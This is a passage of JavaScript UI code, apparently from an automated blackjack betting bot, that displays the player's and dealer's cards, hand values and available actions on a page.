        if (bot.blackjackState.playerHands.length > 0) {
            const hand = bot.blackjackState.playerHands[bot.blackjackState.currentHandIndex] || bot.blackjackState.playerHands[0];
            const cards = hand.cards || [];
            playerCardsEl.innerText = cards.map(c => `${c.rank}${c.suit}`).join(' ');
            
            const value = calculateHandValue(cards);
            playerValueEl.innerText = value > 0 ? `(${value})` : '';
        } else {
            playerCardsEl.innerText = '-';
            playerValueEl.innerText = '';
        }
        
        // Display dealer hand
        if (bot.blackjackState.dealerHand.length > 0) {
            const cards = bot.blackjackState.dealerHand;
            dealerCardsEl.innerText = cards.map(c => `${c.rank}${c.suit}`).join(' ');
            
            const value = calculateHandValue(cards);
            dealerValueEl.innerText = `(${value})`;
        } else {
            dealerCardsEl.innerText = '-';
            dealerValueEl.innerText = '';
        }
        
        // Display available actions (dari hand aktif)
        if (bot.blackjackState.playerHands.length > 0) {
            const hand = bot.blackjackState.playerHands[bot.blackjackState.currentHandIndex] || bot.blackjackState.playerHands[0];
            const actions = hand.actions || [];
            actionsEl.innerText = actions.join(' | ').toUpperCase();
        } else {
            actionsEl.innerText = '-';
        }
        
        // Display last result
        if (bot.lastBetResult) {
